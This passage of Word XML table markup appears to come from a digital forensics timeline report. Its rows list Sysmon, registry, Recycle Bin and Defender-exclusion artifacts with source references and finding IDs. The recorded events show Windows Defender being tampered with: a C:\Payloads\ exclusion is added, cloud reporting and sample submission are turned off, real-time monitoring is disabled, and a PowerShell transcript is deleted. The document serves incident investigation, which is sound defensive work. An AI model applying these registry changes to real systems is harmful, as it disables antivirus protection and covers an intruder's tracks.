            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\wevtutil.exe uninstall-manifest "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.23100.2009-0\Microsoft-Antimalware-AMFilter.man"</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1088, ProcessGUID: e6e9f951-0b7a-654e-fa00-000000000500 | RuleName: - | MD5=53748B0CD4C78AF5EF1D4E77F3C873AF,SHA256=E16B9D201EC1D7E29B3AD532A9AD8F1AE0CB5821BB916A79F6DBEB1C6E6B85FA,IMPHASH=34BC1195516E78393351B444DF843666 | ParentProcess: C:\Program Files\Windows Defender\MsMpEng.exe | ParentProcessID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18461</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Exclusions\Paths</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender | C:\Payloads\=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1456</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, F-017, I-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Spynet</w:t>
              <w:br/>
              <w:t>Antivirus | Windows Defender | SpyNetReporting=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1443</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Spynet</w:t>
              <w:br/>
              <w:t>Antivirus | Windows Defender | SubmitSamplesConsent=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1444</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247112</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender (exclusions)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>exclusion: regf_mtime</w:t>
              <w:br/>
              <w:t>type=Paths | value=C:\Payloads\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/defender.exclusions.jsonl#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, F-004, F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:56:07</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Recycle Bin ($I)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Deletion (moved to Recycle Bin)</w:t>
              <w:br/>
              <w:t>C:\Transcript\20231110\PowerShell_transcript.DESKTOP-KJ81A5A.c4CYCMv_.20231110025534.txt</w:t>
              <w:br/>
              <w:t>size=11303 $I</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>rbcmd/recyclebin_0.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$IX8NRQ1.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:09.773548</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>consent.exe 6492 420 0000019A5C0280F0</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 5392, ProcessGUID: e6e9f951-0db1-654e-8301-000000000500 | RuleName: - | MD5=EE2A1C85C472F89B146CC8EE598CCCBC,SHA256=19FD0010DA92B654D1CA270247061A39EA13C0A58529FD8257A97E2EF7794911,IMPHASH=522D83761201075834F05037F5307949 | ParentProcess: C:\Windows\System32\svchost.exe | ParentProcessID: 6492, Parent</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18635</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.356955</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\SecurityHealthHost.exe {6CED0DAA-4CDE-49C9-BA3A-AE163DC3D7AF} -Embedding</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2708, ProcessGUID: e6e9f951-0db3-654e-8401-000000000500 | RuleName: - | MD5=18CB1CDF0666FF08918BADE605087CEC,SHA256=4CB149DB4441B25F3C837B97477BF5A81C51735D76B123D396AA214FED100522,IMPHASH=588F984996756BEE8EBFE48A7299428F | ParentProcess: C:\Windows\System32\svchost.exe | ParentProcessID: 772, ParentP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18636</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.558959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Real-Time Protection</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender | DisableRealtimeMonitoring=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1447</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, F-017, T-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.567907</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 13 | Microsoft-Windows-Sysmon | RegistryEvent (Value Set) | ProcessID: 6388, ProcessGUID: e6e9f951-0b81-654e-1901-000000000500 | RuleName: T1089,Tamper-Defender | Image: C:\ProgramData\Microsoft\Windows Defender\platform\4.18.23100.2009-0\MsMpEng.exe | EventType: SetValue | TargetObject: HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18637</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, F-017, T-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:12.113188</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 13 | Microsoft-Windows-Sysmon | RegistryEvent (Value Set) | ProcessID: 632, ProcessGUID: e6e9f951-0900-654e-0b00-000000000500 | RuleName: T1031,T1050 | Image: C:\Windows\system32\services.exe | EventType: SetValue | TargetObject: HKLM\System\CurrentControlSet\Services\WdNisDrv\Start | Details: DWORD (0x00000003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18638</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:12.400713</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5001 | Microsoft-Windows-Windows Defender | Real-time Protection was disabled | Windows Defender Antivirus</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23752</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, F-017, T-002, T-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:56.154634</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>consent.exe 6492 468 0000019A5C088A40</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2016, ProcessGUID: e6e9f951-0de0-654e-8701-000000000500 | RuleName: - | MD5=EE2A1C85C472F89B146CC8EE598CCCBC,SHA256=19FD0010DA92B654D1CA270247061A39EA13C0A58529FD8257A97E2EF7794911,IMPHASH=522D83761201075834F05037F5307949 | ParentProcess: C:\Windows\System32\svchost.exe | ParentProcessID: 6492, Parent</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18641</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:57.767576</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
